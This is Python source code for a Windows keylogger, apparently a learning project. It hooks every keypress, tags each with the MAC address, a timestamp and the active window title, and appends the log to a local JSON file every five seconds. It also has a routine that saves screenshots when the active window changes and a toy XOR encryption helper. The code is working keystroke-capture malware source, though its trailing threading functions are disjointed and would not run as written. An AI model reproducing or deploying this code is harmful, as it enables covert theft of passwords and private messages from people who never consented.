import threading
import time
import keyboard
import os
import  json
from getmac import get_mac_address
import win32gui
from PIL import ImageGrab

class Encryptor:
    @staticmethod
    def xor_encryption(text):
        key = "a"
        encrypted_text = ""
        for i in range(len(text)):
            encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
        return encrypted_text


class KeyloggerService:
    def __init__(self):
        self._action = False
        self.__data = {}
        self.prev_up = None
        self.current_app = None
        self.start()

    def __change_action(self):
        self._action = not (self._action)

    def operation_mode(self):
        return self._action

    def __exit_point(self):
        if keyboard.is_pressed('q'):
            self.__change_action()

    @staticmethod
    def __current_time() -> str:
        return time.strftime('%d/%m/%Y  %H:%M')


    def __on_press(self, pressed_key):
        key = pressed_key.name
        self.__add_to_data(self.__data, key)
        self.__exit_point()


    def __add_on_release(self, pressed_key):
        return pressed_key.name


    def current_screenshot(self):
        if self.prev_up != self.current_app:
            screen_shot = ImageGrab.grab()
            path = rF"C:\Users\1\projet keylogger kodkode\keylogger_picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
            screen_shot.save(path)
            self.prev_up = self.current_app

    def __add_to_data(self, dictionary: dict, data: str):

        current_time = self.__current_time()
        current_mac_address = get_mac_address()
        current_app_1 = win32gui.GetForegroundWindow()
        current_app =win32gui.GetWindowText(current_app_1)
        self.current_app = rf"{current_app}"

        if not dictionary.get(current_mac_address):
            dictionary[current_mac_address] = {}

        if not dictionary[current_mac_address].get(current_time):
            dictionary[current_mac_address][current_time] = {}

        if not dictionary[current_mac_address][current_time].get(self.current_app):
            dictionary[current_mac_address][current_time][self.current_app] = []

        dictionary[current_mac_address][current_time][self.current_app].append(data)

    def start(self):
        keyboard.on_press(self.__on_press)
        keyboard.on_release(self.__add_on_release)
        time.sleep(0.1)


    def get_data(self):
        data = self.__data
        self.__data = {}
        return data

    def __enter__(self):
        self.start()

    def __exit__(self, exc_type, exc_val, exc_tb):
        return 1

class FileWriter:
    @staticmethod
    def write_to_file(data:dict):
        if data:
            with open(r"C:\Users\1\projet keylogger kodkode\keys.json", "a" , encoding="utf-8") as file:
                json.dump(data , file , ensure_ascii=False, indent=4 )


class KeyLoggerManager:

    def __init__(self):
        self.instance = KeyloggerService()
        self.stop = False

    def stop(self):
        self.stop = True

    def start(self)-> threading:
        self.instance.start()

    def write_to_file(self)-> threading:
            FileWriter.write_to_file(self.instance.get_data())


    def main(self):
        while  True:
            if not self.stop :
                self.write_to_file()
                time.sleep(5)
print(get_mac_address())

A = KeyLoggerManager()
A.main()





def xor_encryption(text, key):
    encrypted_text = ""
    for i in range(len(text)):
        encrypted_text += str(ord(text[i]) ^ ord(key[i % len(key)]))

    return encrypted_text


a = (xor_encryption("daen", "jdas"))
print(a)
b = xor_encryption(a,"jdas")
print(b)


def function_A(self, stop_event):
    while not stop_event.is_set():
        self.write_to_file()


def function_B(self, stop_event):
    while not stop_event.is_set():
        self.instance.current_screenshot()


def main(self):
    stop_event = threading.Event()

    thread_A = threading.Thread(target=self.function_A, args=(stop_event,))
    thread_B = threading.Thread(target=self.function_B, args=(stop_event,))


    thread_A.start()
    thread_B.start()
    thread_A.join()
    thread_B.join()